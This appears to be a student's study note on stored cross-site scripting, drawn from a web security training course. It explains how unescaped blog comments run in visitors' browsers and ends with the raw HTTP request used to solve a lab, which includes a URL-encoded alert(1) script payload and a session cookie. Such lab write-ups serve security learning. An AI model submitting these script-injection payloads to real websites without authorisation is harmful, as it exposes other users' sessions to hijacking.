#### What is stored cross-site scripting?   
Stored XSS or persistent XSS araises when an application recieves data from an untrusted source and includes that data within its later HTTP responses in an unsafe way. 

Suppose a website allows users to submit comments on blog posts, which are displayed to other users. Users submit comments using an HTTP  request like the following:  

>POST /post/comment HTTP/1.1  
>Host: vulnerable-website.com  
>Content-Length: 100  
>postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net  

After this comment has been submitted, any user who visits the blog post will receive the following within the application's response:
><p>This post was extremely helpful.</p>  
Assuming the application doesn't perform any other processing of the data, an attacker can submit a malicious comment like this:
><script>/* Bad stuff here... */</script>  

Within the attacker's request, this comment would be URL-encoded as:  
>comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E  

Any user who visits the blog post will now receive the following within the application's response:
<p><script>/* Bad stuff here... */</script></p>  

The script supplied by the attacker will then execute in the victim user's browser, in the context of their session with the application. 

***

###### Lab: Stored XSS into HTML context with nothing encoded  
>POST /post/comment HTTP/1.1  
>Host: ac3a1ff01e93fd038023e57d00360025.web-security-academy.net  
>User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0  
>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
>Accept-Language: en-US,en;q=0.5  
>Accept-Encoding: gzip, deflate  
>Referer: https://ac3a1ff01e93fd038023e57d00360025.web-security-academy.net/post?postId=2  
>Cookie: session=uE2UxMTA7XRIh1tvGZfMWOgWpunGIQUZ  
>Connection: close  
>Upgrade-Insecure-Requests: 1  
>Content-Type: application/x-www-form-urlencoded  
>Content-Length: 144  

>csrf=DrnM0FYX8iuxJY8DWROKokJK6svLtua9&postId=2&comment=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&name=wardaddy&email=wardaddy%40localhost&website=
